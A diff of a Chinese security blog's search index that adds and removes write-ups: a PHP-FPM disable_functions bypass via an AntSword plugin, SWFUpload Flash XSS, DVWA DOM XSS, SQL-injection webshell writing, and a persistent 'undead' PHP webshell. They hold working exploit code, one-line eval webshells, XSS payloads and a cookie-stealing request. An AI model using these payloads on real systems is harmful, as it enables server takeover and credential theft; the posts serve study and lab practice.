@@ -1,6 +1,18 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[从蚁剑插件看利用PHP-FPM绕过disable_functions]]></title>
+    <url>%2F2019%2F08%2F03%2F%E4%BB%8E%E8%9A%81%E5%89%91%E6%8F%92%E4%BB%B6%E7%9C%8B%E5%88%A9%E7%94%A8PHP-FPM%E7%BB%95%E8%BF%87disable-functions%2F</url>
+    <content type="text"><![CDATA[0x01 环境准备与插件使用这是蚁剑上的一个disable_functions项目：https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/5 Docker部署非常方便，文档也说明了如何用蚁剑的插件来Bypass disable_functions。本次示例的插件适用于PHP-FPM/FCGI 监听在 unix socket 或者 tcp socket 上时使用。常见的比如：nginx + fpm。 题目直接就是个WebShell： 1234&lt;?php@eval($_REQUEST['ant']);show_source(__FILE__);?&gt; 查看phpinfo，看到服务器中PHP是用FPM/FastCGI的连接模式启动的： 其中open_basedir未设置，而disable_functions设置如下： 1pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system,putenv 可看到，命令执行函数、mail()、putenv()、dl()等经常用来绕过disable_functions的函数都被禁用掉了。 用蚁剑直接连接看看，Web根目录下有两个php，代码是一样的： 切到虚拟终端，命令执行不成功： 后面就添加插件再试试。先去插件市场下载安装绕过disable_functions插件，然后加载进来，选择PHP-FPM/FastCGI模式进行，FPM地址根据需要自行查找配置文件，然后点击开始即可： 操作成功后，会显示成功上传代理脚本和一个so文件，在Web根目录下会多了个.antproxy.php文件，我们添加副本改为该代理PHP文件即可成功Bypass disable_functions： 下面我们探究下这个插件的原理。 0x02 原理分析简单地说，就是利用WebShell去连接本地的PHP-FPM端口搞事情，让其另起一个不以php.ini为配置的PHP程序，然后通过连接上传的代理文件直接绕过了原本的PHP程序，从而绕过disable_functions的限制。 .antproxy.php分析看下.antproxy.php中的代码，向本地监听的63611端口的index.php发送请求： 12345&lt;?php set_time_limit(120); $aAccess = curl_init(); curl_setopt($aAccess, CURLOPT_URL, "http://127.0.0.1:63611/index.php?".$_SERVER['QUERY_STRING']); ... 我们在目标服务器执行netstat看看是不是开启了63611端口的监听： 确实开启了，那这个端口到底属于哪个进程的呢？我们直接ps命令看看： 可以看到，启用的程序的命令为： 1php -n -S 127.0.0.1:63611 -t /var/www/html 解释一下里面的几个参数： -S 127.0.0.1:63611：新Web服务的监听地址； -t /var/www/html/：新HTTP服务的Web根目录，可随便指，只要保证那个目录下面有个PHP WebShell就行，建议是直接指定成Shell当前目录； -n：表示不使用php.ini，这个新的服务PHP用的是默认配置，是核心所在，从而根本不受php.ini中disable_functions的影响，当使用代理连接到该PHP服务时也就实现Bypass了； 插件源码分析我们看下蚁剑绕过disable_functions的插件的主要代码，代码在：https://github.com/Medicean/as_bypass_php_disable_functions/blob/7d28318c5f0a795dc96bda95e37d04a05b5bf2a2/core/php_fpm/index.js 这里我们直接看exploit()函数，这里插件exp编写的地方： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131// 执行EXP, 必须有这个函数exploit() &#123; let self = this; let fpm_host = ''; let fpm_port = -1; let port = Math.floor(Math.random() * 5000) + 60000; // 60000~65000 if (self.form.validate()) &#123; self.cell.progressOn(); let core = self.top.core; let formvals = self.form.getValues(); let phpbinary = formvals['phpbinary']; formvals['fpm_addr'] = formvals['fpm_addr'].toLowerCase(); if (formvals['fpm_addr'].startsWith('unix:')) &#123; fpm_host = formvals['fpm_addr']; &#125; else if (formvals['fpm_addr'].startsWith('/')) &#123; fpm_host = `unix://$&#123;formvals['fpm_addr']&#125;` &#125; else &#123; fpm_host = formvals['fpm_addr'].split(':')[0] || ''; fpm_port = parseInt(formvals['fpm_addr'].split(':')[1]) || 0; &#125; // 生成 ext let wdir = ""; if (self.isOpenBasedir) &#123; for (var v in self.top.infodata.open_basedir) &#123; if (self.top.infodata.open_basedir[v] == 1) &#123; if (v == self.top.infodata.phpself) &#123; wdir = v; &#125; else &#123; wdir = v; &#125; break; &#125; &#125;; &#125; else &#123; wdir = self.top.infodata.temp_dir; &#125; let cmd = `$&#123;phpbinary&#125; -n -S 127.0.0.1:$&#123;port&#125; -t $&#123;self.top.infodata.phpself&#125;`; let fileBuffer = self.generateExt(cmd); if (!fileBuffer) &#123; toastr.warning(PHP_FPM_LANG['msg']['genext_err'], LANG_T["warning"]); self.cell.progressOff(); return &#125; new Promise((res, rej) =&gt; &#123; var ext_path = `$&#123;wdir&#125;/.$&#123;String(Math.random()).substr(2, 5)&#125;$&#123;self.ext_name&#125;`; // 上传 ext core.request( core.filemanager.upload_file(&#123; path: ext_path, content: fileBuffer &#125;) ).then((response) =&gt; &#123; var ret = response['text']; if (ret === '1') &#123; toastr.success(`Upload extension $&#123;ext_path&#125; success.`, LANG_T['success']); res(ext_path); &#125; else &#123; rej("upload extension fail"); &#125; &#125;).catch((err) =&gt; &#123; rej(err) &#125;); &#125;).then((p) =&gt; &#123; // 触发 payload, 会超时 var payload = `$&#123;FastCgiClient()&#125;; $content=""; $client = new Client('$&#123;fpm_host&#125;',$&#123;fpm_port&#125;); $client-&gt;request(array( 'GATEWAY_INTERFACE' =&gt; 'FastCGI/1.0', 'REQUEST_METHOD' =&gt; 'POST', 'SERVER_SOFTWARE' =&gt; 'php/fcgiclient', 'REMOTE_ADDR' =&gt; '127.0.0.1', 'REMOTE_PORT' =&gt; '9984', 'SERVER_ADDR' =&gt; '127.0.0.1', 'SERVER_PORT' =&gt; '80', 'SERVER_NAME' =&gt; 'mag-tured', 'SERVER_PROTOCOL' =&gt; 'HTTP/1.1', 'CONTENT_TYPE' =&gt; 'application/x-www-form-urlencoded', 'PHP_VALUE' =&gt; 'extension=$&#123;p&#125;', 'PHP_ADMIN_VALUE' =&gt; 'extension=$&#123;p&#125;', 'CONTENT_LENGTH' =&gt; strlen($content) ), $content ); sleep(1); echo(1); `; core.request(&#123; _: payload, &#125;).then((response) =&gt; &#123; &#125;).catch((err) =&gt; &#123; // 超时也是正常 &#125;) &#125;).then(() =&gt; &#123; // 验证是否成功开启 var payload = `sleep(1); $fp = @fsockopen("127.0.0.1", $&#123;port&#125;, $errno, $errstr, 1); if(!$fp)&#123; echo(0); &#125;else&#123; echo(1); @fclose($fp); &#125;;` core.request(&#123; _: payload, &#125;).then((response) =&gt; &#123; var ret = response['text']; if (ret === '1') &#123; toastr.success(LANG['success'], LANG_T['success']); self.uploadProxyScript("127.0.0.1", port); self.cell.progressOff(); &#125; else &#123; self.cell.progressOff(); throw ("exploit fail"); &#125; &#125;).catch((err) =&gt; &#123; self.cell.progressOff(); toastr.error(`$&#123;LANG['error']&#125;: $&#123;JSON.stringify(err)&#125;`, LANG_T['error']); &#125;) &#125;).catch((err) =&gt; &#123; self.cell.progressOff(); toastr.error(`$&#123;LANG['error']&#125;: $&#123;JSON.stringify(err)&#125;`, LANG_T['error']); &#125;); &#125; else &#123; self.cell.progressOff(); toastr.warning(LANG['form_not_comp'], LANG_T["warning"]); &#125; return;&#125; 其中generateExt()函数的定义在Base.js中： 12345678910111213141516171819202122232425262728293031323334// 生成扩展generateExt(cmd) &#123; let self = this; let fileBuff = fs.readFileSync(self.ext_path); let start = 0, end = 0; switch (self.ext_name) &#123; case 'ant_x86.so': start = 275; end = 504; break; case 'ant_x64.so': // 434-665 start = 434; end = 665; break; case 'ant_x86.dll': start = 1544; end = 1683; break; case 'ant_x64.dll': start = 1552; end = 1691; break; default: break; &#125; if(cmd.length &gt; (end - start)) &#123; return &#125; fileBuff[end] = 0; fileBuff.write(" ", start); fileBuff.write(cmd, start); return fileBuff;&#125; 简单说下过程： 随机生成一个端口号，作为后续新起的PHP服务的端口； 判断当前PHP-FPM为TCP模式或Unix Socket模式来据此获得FPM地址和端口，用于后面和服务器中FPM服务的访问； 以拼接组成的用于启动新PHP服务的命令的cmd变量为参数，调用generateExt()生成扩展，将cmd内容插入到指定范围内去； 将扩展命名为.xxxxxant_x64.so并上传； 上传成功后，构造并触发payload：先初始化FastCgi客户端，再构造连接服务端PHP-FPM服务的fastcgi协议包、指定PHP_VALUE和PHP_ADMIN_VALUE为上传的扩展文件，最后向目标服务端PHP-FPM服务发送该fastcgi协议请求包，目的是加载执行上传的ext文件、从而新起一个PHP进程； 最后尝试连接本地前面随机生成的端口号，确认payload是否触发成功，若OK则上传代理脚本； .69773ant_x64.so分析从前面的代码中的generateExt()函数知道，是直接对二进制数据操作，在start到end中填入cmd。 这里我们将该so文件下载下来，本想逆向看下给出的几个基础框架文件是怎么写的，但是因为so文件格式不对无法用ida直接看.69773ant_x64.so文件，所以这里是用ida打开的Windows版本的ant_x64.dll文件进行查看分析： 可以看到，构造很简单，只有一个函数用于调用执行system()，而start和end区域（ant_x64.dll为1552~1691）就是system()函数内参数的区域，直接往里写就能执行恶意命令，简单粗暴： 这里我们也用WinHex打开.69773ant_x64.so（434~665）文件查看对应区域的内容，确实填充的是新起PHP服务的命令： 0x03 小结若目标站点是使用PHP-FPM的方式启动PHP服务的，且存在WebShell文件、开启了disable_functions限制了包括putenv()等函数及未设置open_basedir，则我们可以通过这种方式进行Bypass： 编写恶意的so/dll文件，其中调用system()函数执行类似于php -n -S 127.0.0.1:63611 -t /var/www/html的命令，用于以php命令新启动一个Web服务；通过WebShell上传该恶意so文件到目标服务器中如tmp目录中；通过PHP代码执行建立FastCgi客户端和目标服务器内部的PHP-FPM进行通信，伪造FastCgi协议包并设置PHP_VALUE和PHP_ADMIN_VALUE为上传的so文件从而可以加载执行该恶意so文件；最后通过WebShell上传代理新起Web服务的PHP文件即可。 一个小问题 既然我们上传的ext文件可以通过攻击PHP-FPM的方式来执行命令，为何还要新起一个PHP服务呢？ 这个本人还没细究，但可以看下参考文章最后补充的回复。 0x04 参考蚁剑disable_functions研究 用WebShell攻击PHP-FPM]]></content>
+      <categories>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>PHP</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[SWFUpload.swf的Flash型XSS分析]]></title>
     <url>%2F2019%2F07%2F31%2FSWFUpload-swf%E7%9A%84Flash%E5%9E%8BXSS%E5%88%86%E6%9E%90%2F</url>
     <content type="text"><![CDATA[0x01 SWFUpload简介SWFUpload是一个客户端文件上传工具，最初由Vinterwebb.se开发，它通过整合Flash与JavaScript技术为Web开发者提供了一个具有丰富功能继而超越传统标签的文件上传模式。 SWFUpload是在国内网站中使用得比较普遍的Flash插件。 0x02 Flash XSS当SWFUpload的版本&lt;= 时，会存在Flash XSS漏洞。 漏洞版本下载地址：https://github.com/JoyChou93/FlashXss/tree/master/swfupload 将文件下载下来后，反编译得到as源代码，可以看到脚本是有三个，这里先关注SWFUpload的代码： SWFUpload的代码量略大，这里直接搜索外部参数输入的关键字，找到对应的代码： 12345678910111213141516171819202122public function SWFUpload() &#123; ... this.movieName = root.loaderInfo.parameters.movieName; this.flashReady_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].flashReady&quot;; this.fileDialogStart_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].fileDialogStart&quot;; this.fileQueued_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].fileQueued&quot;; this.fileQueueError_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].fileQueueError&quot;; this.fileDialogComplete_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].fileDialogComplete&quot;; this.uploadStart_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].uploadStart&quot;; this.uploadProgress_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].uploadProgress&quot;; this.uploadError_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].uploadError&quot;; this.uploadSuccess_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].uploadSuccess&quot;; this.uploadComplete_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].uploadComplete&quot;; this.debug_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].debug&quot;; this.testExternalInterface_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].testExternalInterface&quot;; this.cleanUp_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].cleanUp&quot;; this.uploadURL = root.loaderInfo.parameters.uploadURL; this.filePostName = root.loaderInfo.parameters.filePostName; this.fileTypes = root.loaderInfo.parameters.fileTypes; this.fileTypesDescription = root.loaderInfo.parameters.fileTypesDescription + &quot; (&quot; + this.fileTypes + &quot;)&quot;; this.loadPostParams(root.loaderInfo.parameters.params); 这里看到好几个变量都是外界可控的，有一个很特别，就是movieName变量，它会被拼接到很多名为xx_Callback的变量值中。我们就跟踪下第一个名为flashReady_Callback变量看看是不是可调用的： 12345if(ExternalCall.Bool(this.testExternalInterface_Callback))&#123; ExternalCall.Simple(this.flashReady_Callback); this.hasCalledFlashReady = true;&#125; 可以看到，在后面的代码中会作为ExternalCall.Simple()函数的唯一参数传入调用。 而ExternalCall.Simple()函数的定义是在另一个名为ExternalCall脚本中，我们到其中搜索看看： bingo，是ExternalInterface.call()函数，且是第一个参数外部可控，妥妥的Flash XSS漏洞。 理下思路，存在AS3形式的loaderInfo.parameters来传入外部参数movieName，且存在ExternalInterface.call()函数的第一个参数外部可控，结合导致Flash XSS。 至于其他几个拼接的变量也是一样的分析。 这里结合ExternalInterface.call()函数的第一个参数的payload的形式，稍微修改下来闭合前面拼接的格式即可： 1?movieName=&quot;])&#125;catch(e)&#123;alert(&apos;mi1k7ea&apos;)&#125;;// 接着就是不停地弹框了： 在IE下调试，可以看到底层被恶意构造输入注入的执行的JS代码： 0x03 参考Flash XSS检测脚本的简单实现]]></content>
@@ -266,8 +278,8 @@
         <category>Python</category>
       </categories>
       <tags>
-        <tag>Python</tag>
         <tag>Web安全</tag>
+        <tag>Python</tag>
         <tag>SSTI</tag>
       </tags>
   </entry>
@@ -279,8 +291,8 @@
         <category>Python</category>
       </categories>
       <tags>
-        <tag>Python</tag>
         <tag>Web安全</tag>
+        <tag>Python</tag>
         <tag>沙箱逃逸</tag>
       </tags>
   </entry>
@@ -814,15 +826,15 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[SQL注入写WebShell方式小结]]></title>
-    <url>%2F2019%2F01%2F01%2FSQL%E6%B3%A8%E5%85%A5%E5%86%99WebShell%E6%96%B9%E5%BC%8F%E5%B0%8F%E7%BB%93%2F</url>
-    <content type="text"><![CDATA[这里小结一下通过SQL注入写入WebShell的方法。 通过SQL注入select into outfile实现，如： 1’ union select 1,’\&lt;?php eval($_POST[a]);?&gt;’ INTO OUTFILE ‘/var/www/tmp/nb.php’# 前提都是需要对目标目录具有写权限。 –os-cmd=”net user”交互式命令执行，注意在使用交互式方式时需要知道网站的绝对路径，执行成功之后在绝对路径下创建文件返回结果，然后再自动删除。 ##–os-shell写webshell，会生成两个文件，tmpbshrd.php和tmpucnll.php，分别为命令执行和文件上传webshell。注意:关闭sqlmap文件就会被删除。 ##本地写入webshell先在sqlmap的目录创建mst目录，然后在该目录中创建mst.txt，内容为一句话木马，之后需要两个参数即本地文件地址和目标文件地址，–file-write “./mst/mst.txt” –file-dest “网站的绝对路径/1.php”。 注意需要最高权限。 MySQL写木马，通常可以通过phpmyadmin来实现。 前提条件：有读写的权限，有CREATE、INSERT、SELECT的权限。 1、创建一个表 CREATE TABLE a (cmd text NOT NULL); 2、插入数据 INSERT INTO a (cmd) VALUES(‘\&lt;?php eval($_POST[‘password’]);?&gt;’); 3、导出一句话 SELECT cmd from a into outfile ‘/var/www/tmp/webshell.php’; 4、删除表 Drop TABLE IF EXISTS a;]]></content>
+    <title><![CDATA[DVWA之DOM型XSS]]></title>
+    <url>%2F2019%2F01%2F01%2F%E9%80%9A%E8%BF%87DVWA%E5%AD%A6%E4%B9%A0DOM%E5%9E%8BXSS%2F</url>
+    <content type="text"><![CDATA[下了个新版的DVWA看了下，发现新增了好几个Web漏洞类型，就玩一下顺便做下笔记，完善一下之前那篇很水的DOM XSS文章，虽然这个也很水 ：） 基本概念DOM，全称Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。 DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞，其触发不需要经过服务器端，也就是说，服务端的防御并不起作用。 在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。 可能触发DOM型XSS的属性document.referer属性 window.name属性 location属性 innerHTML属性 documen.write属性 ······ Low级别点击正常功能观察： 查看页面源码，可以看到以下框中的JS代码，从URL栏中获取default参数的值，这里是通过获取“default=”后面的字符串来实现的，然后直接写到option标签中，并没有对特殊字符进行任何的过滤： 可以明确，这是由document.write属性造成的DOM型XSS漏洞。 因为这段JS代码是本地执行的，获取本地输入的URL栏上的default参数再直接嵌入到option标签中的，因而可以直接往default参数注入XSS payload即可： \alert(document.cookie)\ 检测元素，可以看到是通过JS在本地动态执行嵌入了script标签： 若要尝试使用其他XSS payload，如img、svg等标签，因为select标签内只允许内嵌option标签，而option标签中能内嵌script标签但不能内嵌img等标签，因此需要在注入时先闭合option和select标签从而使注入的标签逃逸出来执行XSS： \\\&lt;img src=x onerror=alert(“SKI12”)&gt; 最后查看源码，没有做任何防御： Medium级别先尝试payload：\alert(document.cookie)\ 发现会重定向到English选项页面。 推测可能是对script字符串进行了过滤，因此进行重复内嵌或大小写组合等方式尝试绕过： \&lt;scri\pt&gt;alert(document.cookie)\&lt;/sc\ript&gt; \alert(document.cookie)\ 然而发现也是会重定向到English选项页面。 应该是对script标签进行了比较严格的过滤， 换个标签类型的payload（注意要闭合前面的标签如low级所说）： \\\&lt;svg/onload=alert(document.cookie)&gt; 弹框成功： 因此可以推测，后台代码只是对script标签进行了有效的过滤，而对于其他标签则未进行过滤。 最后查看源码，发现只对script标签进行了过滤，过滤方式是调用stripos()函数获取“\&lt;script”字符串出现在参数的哪个位置（不区分大小写），因此重复内嵌和大小写等方式无法绕过该过滤机制： High级别经过一系列XSS payload的尝试，没有成功 : ( 没办法，看下源码吧： 发现已经白名单写死了，推测是不是存在某种截断可以使得XSS得以注入弹框。 试了一会并未成功，无奈查看一下help提示： The developer is now white listing only the allowed languages, you must find a way to run your code without it going to the server. Spoiler: The fragment section of a URL (anything after the # symbol) does not get sent to the server and so cannot be blocked. The bad JavaScript being used to render the page reads the content from it when creating the page. 大概意思就是，需要找一种方法在本地运行你的JS代码而无需经过服务器端的处理。这里提供的一种方法就是，应用#号，URL栏的#号之后的内容并不会发送至服务器端，JS应用该符号实现在页面创建加载过程中定向到指定的页面内容上。 试一下在白名单字符串后添加#号的payload，刚输入进去是无反应的，需要刷新一下触发JS中#号的作用才能弹框： English#\\\ Impossible级别直接看源码吧： 说是服务器端不需要做任何防御措施，防御的关键在于客户端上。 查看help怎么说： The contents taken from the URL are encoded by default by most browsers which prevents any injected JavaScript from being executed. 大致就是，大多数浏览器默认都对从URL中获取的内容进行编码，以防止JS代码注入执行。 回到xss dom的index.php中可以看到，对于impossible级别来说，在JS代码document.write()中调用的decodeURI()是个空函数，即并不会对URL输入进行URL编码过的内容再进行URL解码从而杜绝了DOM型XSS： 测试一下，注入payload，发现确实没有进行URL解码： 漏洞利用和之前写的《关于DOM型XSS漏洞的学习笔记》一样，将其重复整理到一起吧。 测试的level是low，其他level同理。 窃取cookie——createElement()利用JS的document.createElement()创建新标签如img并将cookie信息通过img标签src属性来请求发往目标主机，payload如下： /xss_d/?default=\var img=document.createElement(“img”);img.src=”http://127.0.0.1:8000/a?&quot;+escape(document.cookie);\ 篡改页面——innerHTML主要用于篡改页面，payload如下： /xss_d/?default=\document.body.innerHTML=”\\DOM XSS By SKI12\\“;\ 键盘记录——document.onkeypress利用document.onkeypress可实现键盘记录。 keylogger.js 放置于攻击者的服务器中，让目标服务器注入XSS后来访问执行。 keylogger.php 放置于攻击者的服务器中，用于接收目标服务器访问执行了keylogger.js后传送回来的用户输入的键盘信息，并保存在本地文件中。 payload： /xss_d/?default=\\ 此时用户在该Web界面输入的任何内容都会实时保存到keylog.txt中： 防御DOM型XSS主要是由客户端的脚本通过DOM动态地输出数据到页面而不是依赖于将数据提交给服务器端，而从客户端获得DOM中的数据在本地执行，因而仅从服务器端是无法防御的。其防御在于： （1） 避免客户端文档重写、重定向或其他敏感操作，同时避免使用客户端数据，这些操作尽量在服务器端使用动态页面来实现； （2） 分析和强化客户端JS代码，特别是受到用户影响的DOM对象，注意能直接修改DOM和创建HTML文件的相关函数或方法，并在输出变量到页面时先进行编码转义，如输出到HTML则进行HTML编码、输出到\则进行JS编码。]]></content>
       <categories>
-        <category>Web安全基础</category>
+        <category>WriteUp:Web</category>
       </categories>
       <tags>
         <tag>Web安全</tag>
-        <tag>SQL注入</tag>
+        <tag>XSS</tag>
       </tags>
   </entry>
   <entry>
@@ -838,28 +850,15 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[PHP内存型木马]]></title>
-    <url>%2F2019%2F01%2F01%2FPHP%E5%86%85%E5%AD%98%E5%9E%8B%E6%9C%A8%E9%A9%AC%2F</url>
-    <content type="text"><![CDATA[基本概念PHP内存性木马即PHP不死马，一般会删除自身以进程的形式循环创建隐蔽的后门。 通常在AWD Web题中用得较多。 Demo及原理nodie.php 123456789101112&lt;?php ignore_user_abort(true); set_time_limit(0); unlink(__FILE__); $file = '/var/www/dvwa/.ski12.php'; $code = '&lt;?php if(md5($_POST["pass"])=="cdd7b7420654eb16c1e1b748d5b7c5b8")&#123;@system($_POST[a]);&#125;?&gt;'; while (1) &#123; file_put_contents($file, $code); system('touch -m -d "2018-12-01 09:10:12" .ski12.php'); usleep(5000); &#125;?&gt; 简单分析： ignore_user_abort()函数设置与客户机断开是否会终止脚本的执行。这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。 set_time_limit()函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制。 unlink(__FILE__)删除文件本身，以起到隐蔽自身的作用。 while循环内每隔usleep(5000)即写新的后门文件，中间system()执行的命令用于修改文件的创建或修改时间，可以绕过“find –name \’*.php\’ –mmin -10”命令检测最近10分钟修改或新创建的PHP文件，但不一定有用，可选。 至于最后生成的隐蔽后门在需要校验一个POST参数的MD5值，原因在于防止其他人可以进行利用。 这里以DVWA为示例： 先找到上传点上传nodie.php： 访问文件所在路径让其执行，等待一会发现404，该文件不存在： 一般而言分两种情况，一种是乐观的、即文件执行成功且删除了自身、生成了隐蔽的后门；另一种是被干掉了。直接访问我们设置生成的隐蔽后门的路径检测一下是否真的生成了后门文件： 虽然没有返回，但确实存在该文件，接着直接利用即可： 以运维的视角尝试删除文件，发现删不掉： 查杀方法1、如果允许，重启服务是万能的； 2、其次，最好的解决方案是kill掉www-data用户的所有子进程： ps aux | grep www-data | awk ‘{print $2}’ | xargs kill -9 3、创建一个和不死马生成的马一样名字的目录； 4、编写一个使用ignore_user_abort(true)函数的脚本，一直竞争写入删除不死马文件，其中usleep()的时间必须要小于不死马的usleep()时间才会有效果。简单示例： 12345678&lt;?phpwhile (1) &#123; $pid = 不死马的进程PID; @unlink(".ski12.php"); exec("kill -9 $pid"); usleep(1000);&#125;?&gt;]]></content>
+    <title><![CDATA[Python安全小工具之反编译pyc文件]]></title>
+    <url>%2F2019%2F01%2F01%2FPython%E5%AE%89%E5%85%A8%E5%B0%8F%E5%B7%A5%E5%85%B7%E4%B9%8B%E5%8F%8D%E7%BC%96%E8%AF%91pyc%E6%96%87%E4%BB%B6%2F</url>
+    <content type="text"><![CDATA[有时需要查看某个Python Web目录内Python源码，但dump下来只有pyc文件而没有py文件，这时需要我们反编译pyc文件为py文件。为了方便就写个脚本遍历目录内的pyc文件并进行反编译。 1234567891011121314151617181920212223242526272829303132#coding=utf-8import osimport sysimport uncompyle6def Decompile(path): if os.path.exists(path): for parent,dirs,files in os.walk(path): for file in files: file_name,ext = os.path.splitext(file) if ext == ".pyc": file_path = os.path.join(parent,file) print "[*]Decompiling:", file_path cmd = "uncompyle6 " + file_path + " &gt; " + parent + "\\" + file_name + ".py" try: os.system(cmd) print "[+]Decompile successful.\n" except Exception as e: print e print "[*]Finished." else: print "[-]Wrong Directory Path."def main(): if len(sys.argv) != 2: print "[*]Usage: python decompile.py [Directory Path]" else: path = sys.argv[1] Decompile(path)if __name__ == "__main__": main() 运行效果：]]></content>
       <categories>
-        <category>PHP</category>
+        <category>Python</category>
       </categories>
       <tags>
-        <tag>AWD</tag>
-        <tag>Web安全</tag>
-        <tag>PHP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[DVWA之DOM型XSS]]></title>
-    <url>%2F2019%2F01%2F01%2F%E9%80%9A%E8%BF%87DVWA%E5%AD%A6%E4%B9%A0DOM%E5%9E%8BXSS%2F</url>
-    <content type="text"><![CDATA[下了个新版的DVWA看了下，发现新增了好几个Web漏洞类型，就玩一下顺便做下笔记，完善一下之前那篇很水的DOM XSS文章，虽然这个也很水 ：） 基本概念DOM，全称Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。 DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞，其触发不需要经过服务器端，也就是说，服务端的防御并不起作用。 在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。 可能触发DOM型XSS的属性document.referer属性 window.name属性 location属性 innerHTML属性 documen.write属性 ······ Low级别点击正常功能观察： 查看页面源码，可以看到以下框中的JS代码，从URL栏中获取default参数的值，这里是通过获取“default=”后面的字符串来实现的，然后直接写到option标签中，并没有对特殊字符进行任何的过滤： 可以明确，这是由document.write属性造成的DOM型XSS漏洞。 因为这段JS代码是本地执行的，获取本地输入的URL栏上的default参数再直接嵌入到option标签中的，因而可以直接往default参数注入XSS payload即可： \alert(document.cookie)\ 检测元素，可以看到是通过JS在本地动态执行嵌入了script标签： 若要尝试使用其他XSS payload，如img、svg等标签，因为select标签内只允许内嵌option标签，而option标签中能内嵌script标签但不能内嵌img等标签，因此需要在注入时先闭合option和select标签从而使注入的标签逃逸出来执行XSS： \\\&lt;img src=x onerror=alert(“SKI12”)&gt; 最后查看源码，没有做任何防御： Medium级别先尝试payload：\alert(document.cookie)\ 发现会重定向到English选项页面。 推测可能是对script字符串进行了过滤，因此进行重复内嵌或大小写组合等方式尝试绕过： \&lt;scri\pt&gt;alert(document.cookie)\&lt;/sc\ript&gt; \alert(document.cookie)\ 然而发现也是会重定向到English选项页面。 应该是对script标签进行了比较严格的过滤， 换个标签类型的payload（注意要闭合前面的标签如low级所说）： \\\&lt;svg/onload=alert(document.cookie)&gt; 弹框成功： 因此可以推测，后台代码只是对script标签进行了有效的过滤，而对于其他标签则未进行过滤。 最后查看源码，发现只对script标签进行了过滤，过滤方式是调用stripos()函数获取“\&lt;script”字符串出现在参数的哪个位置（不区分大小写），因此重复内嵌和大小写等方式无法绕过该过滤机制： High级别经过一系列XSS payload的尝试，没有成功 : ( 没办法，看下源码吧： 发现已经白名单写死了，推测是不是存在某种截断可以使得XSS得以注入弹框。 试了一会并未成功，无奈查看一下help提示： The developer is now white listing only the allowed languages, you must find a way to run your code without it going to the server. Spoiler: The fragment section of a URL (anything after the # symbol) does not get sent to the server and so cannot be blocked. The bad JavaScript being used to render the page reads the content from it when creating the page. 大概意思就是，需要找一种方法在本地运行你的JS代码而无需经过服务器端的处理。这里提供的一种方法就是，应用#号，URL栏的#号之后的内容并不会发送至服务器端，JS应用该符号实现在页面创建加载过程中定向到指定的页面内容上。 试一下在白名单字符串后添加#号的payload，刚输入进去是无反应的，需要刷新一下触发JS中#号的作用才能弹框： English#\\\ Impossible级别直接看源码吧： 说是服务器端不需要做任何防御措施，防御的关键在于客户端上。 查看help怎么说： The contents taken from the URL are encoded by default by most browsers which prevents any injected JavaScript from being executed. 大致就是，大多数浏览器默认都对从URL中获取的内容进行编码，以防止JS代码注入执行。 回到xss dom的index.php中可以看到，对于impossible级别来说，在JS代码document.write()中调用的decodeURI()是个空函数，即并不会对URL输入进行URL编码过的内容再进行URL解码从而杜绝了DOM型XSS： 